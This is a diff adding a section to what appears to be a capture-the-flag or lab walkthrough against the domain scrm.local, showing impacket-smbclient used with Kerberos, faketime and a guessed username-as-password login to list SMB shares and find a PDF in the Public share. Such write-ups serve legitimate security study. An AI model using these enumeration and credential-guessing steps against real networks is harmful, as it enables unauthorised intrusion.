@@ -204,3 +204,31 @@ SMB         dc1.scrm.local  445    dc1              ksimpson                    
 SMB         dc1.scrm.local  445    dc1              [*] Enumerated 15 local users: SCRM
 SMB         dc1.scrm.local  445    dc1              [*] Writing 15 local users to users.txt
 ```
+
+# `Public` SMB share
+```python
+faketime '16:56:27.733020' impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local -k
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+Type help for list of commands
+# shares
+ADMIN$
+C$
+HR
+IPC$
+IT
+NETLOGON
+Public
+Sales
+SYSVOL
+# use Public
+# dir
+*** Unknown syntax: dir
+# ls
+drw-rw-rw-          0  Thu Nov  4 22:23:19 2021 .
+drw-rw-rw-          0  Thu Nov  4 22:23:19 2021 ..
+-rw-rw-rw-     630106  Fri Nov  5 17:45:07 2021 Network Security Changes.pdf
+```
+Found a .pdf file
+
